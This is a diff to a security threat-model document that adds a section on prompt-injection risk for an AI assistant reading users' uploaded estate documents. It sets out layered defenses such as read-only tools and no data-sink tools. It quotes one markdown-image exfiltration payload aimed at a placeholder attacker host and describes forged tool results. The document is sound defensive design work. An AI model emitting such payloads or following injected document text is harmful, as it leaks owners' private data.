@@ -442,6 +442,75 @@ accepted deliberately because an actionable body is what makes the
 notification function as a control. Fully closing it is the isolated-origin
 push channel, a later milestone.
 
+## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)
+
+The assistant is the first component an attacker can address in **natural
+language**, through document text the owner uploaded and asked it to read. Risk
+#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.
+
+**Treatment, in the order it actually holds.** The register's stated treatment
+was "untrusted-input framing, read-only tools, output filtering". Building it
+made the ordering clear, and the ordering is the finding:
+
+1. **No tool schema can name a subject.** A tool receives its authority — the
+   verified session subject plus that caller's bearer — and declares only what
+   to fetch, never whose data. Injected text can persuade the model to CALL a
+   tool; it has no field in which to say whose estate it wants. Enforced at
+   registry construction, so a violation is a process that will not start.
+2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
+   or web-search tool. The worst a successful injection achieves is a
+   misleading answer to the owner about the owner's own data, which is exactly
+   why the impact rating is Medium and what keeps it there. Adding any
+   outward-facing tool would change that rating and requires revisiting this
+   section.
+3. **Framing retrieved text as data is ADVISORY** and is documented as the
+   weakest layer in its own source file. It neutralizes delimiter injection so
+   content cannot terminate its own block, but a sufficiently clever payload can
+   argue with layer 3. Layers 1 and 2 cannot be argued with.
+
+"Output filtering" is deliberately NOT claimed as a control. The UI renders
+restricted markdown with no autolinking and no remote images (PR4), which stops
+a model-emitted `![](https://attacker/?data=…)` from becoming an exfiltration
+channel; that is a rendering constraint, not a filter on model output, and
+calling it filtering would overclaim.
+
+**TB5 — the LLM provider boundary.** The assistant is the isolating service:
+the provider SDK and its credential will exist only there (PR2). It holds NO
+internal service credential in either direction, so a compromised assistant
+replays the sessions it is currently serving and cannot mint new authority —
+the property is machine-checked by the credential graph rather than asserted.
+Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
+they are persisted precisely so the client cannot supply history: a
+client-supplied transcript could forge prior assistant turns and prior tool
+results, and a forged tool result is indistinguishable from a real one.
+
+**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
+requires providers under zero-data-retention agreements. Claude Fable 5
+requires 30-day retention and is not available under ZDR, so the most capable
+model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.
+
+**Consent.** Deny by default structurally — there is no `granted` boolean, so
+a user who never answered and one who revoked are the same answer. Granting is
+step-up gated because it widens third-party egress (export-class under docs/01
+§5); revoking is not, on the M6 rule that the protective action must never be
+harder than the permissive one.
+
+**Recorded, not fixed.**
+- *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
+  no decrypt counterpart and M10 does not add one, so the assistant cannot
+  discuss anything a user uploaded. That is a capability gap, not a control —
+  closing it means building a bulk-readable text path, which is what §5.3
+  exists to prevent, and it needs its own PR, consent scope and delta.
+- *Conversations are outside staged settlement access (§6a).* An executor gets
+  inventory, then documents, then vault; conversations are in none of those
+  rungs and `assistant.cedar` grants no role-holder verb. A transcript ranges
+  over the whole estate and may contain content the owner never intended anyone
+  to read, so admitting it would need its own milestone and its own decision.
+- *The egress assertion is narrow on purpose.* It refuses separated SSNs and
+  Luhn-valid card numbers and deliberately passes names, emails and phone
+  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
+  estate traffic is one people route around.
+
 ## 7. Validation program
 
 - **Continuous:** SAST/DAST/dependency scanning in CI; fuzzing on parsers (document ingest, OCR, webhook handlers); secrets scanning; IaC policy checks (tfsec/OPA).
